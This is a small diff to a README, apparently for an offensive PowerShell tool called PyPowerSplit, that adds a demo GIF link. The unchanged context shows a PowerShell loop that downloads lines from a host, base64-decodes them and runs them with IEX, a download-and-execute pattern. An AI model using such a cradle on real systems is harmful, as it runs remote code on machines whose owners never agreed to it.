@@ -23,3 +23,6 @@ ForEach ($line in $((New-Object Net.WebClient).DownloadString('http://192.168.0.
     [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($line)) | IEX
 }
 ```
+
+# DEMO
+[![Demo](https://github.com/oXis/PyPowerSplit/raw/master/vid/demo.gif)]()
